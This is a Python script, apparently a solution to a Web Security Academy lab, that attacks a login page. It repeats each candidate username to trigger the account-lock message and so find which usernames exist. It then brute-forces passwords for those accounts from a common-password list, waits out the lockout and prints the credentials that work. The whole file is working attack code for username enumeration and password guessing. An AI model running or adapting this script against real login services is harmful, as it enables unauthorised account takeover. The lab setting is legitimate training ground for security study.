import requests
import sys
import time

URL_LOGIN = 'https://0abf008f0486a14f80e83fcc0008000d.web-security-academy.net/login'
INVALID_USERNAME_RESPONSE = "Invalid username or password."
VALID_USERNAME_RESPONSE = "You have made too many incorrect login attempts."


headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36'
}

proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080',
}

payload = {
    'username': '',
    'password': '',
}

usernames = open('./../common_username.txt', 'r', encoding='utf-8').read().strip().split('\n')
passwords = open('./../common_password.txt', 'r', encoding='utf-8').read().strip().split('\n')

session = requests.Session()


def modify_list():
    with open('modified_user_list.txt', 'w', encoding='utf-8') as f:
        for username in usernames:
            for _ in range(5):
                f.write(username + '\n')

def validate_username():
    user_list = open('modified_user_list.txt', 'r', encoding='utf-8').read().strip().split('\n')
    valid_users = []
    for username in user_list:
        payload['username'] = username
        payload['password'] = '123456789'
        r = session.post(URL_LOGIN, data=payload, headers=headers)

        print(username, r.status_code)
        if VALID_USERNAME_RESPONSE in r.text:
            valid_users.append(username)

    if not len(valid_users):
        print('Don\'t have username valid in the list')
    
    return valid_users

def bruteforce(valid_users):
    validate_account = []
    for username in valid_users:
        for password in passwords:
            payload['username'] = username
            payload['password'] = password
            r = session.post(URL_LOGIN, data=payload, headers=headers)

            if VALID_USERNAME_RESPONSE not in r.text and INVALID_USERNAME_RESPONSE not in r.text:
                validate_account.append((username, password))
                break

    return validate_account


if __name__ == '__main__':
    modify_list()
    valid_users = validate_username()
    valid_users = list(set(valid_users))
    print(valid_users)
    valid_acc = bruteforce(valid_users)

    print("Wait 1 min until account is unlock")
    time.sleep(60)
    print("Start login to valid accounts")
    for username, password in valid_acc:
        payload['username'] = username
        payload['password'] = password
        r = session.post(URL_LOGIN, data=payload, headers=headers)

        if VALID_USERNAME_RESPONSE not in r.text and INVALID_USERNAME_RESPONSE not in r.text:
            print(f'Login successfully to account \'{username}\'')
            print(f'Username: {username}, Password: {password}')

    print("Finish bypass account lock")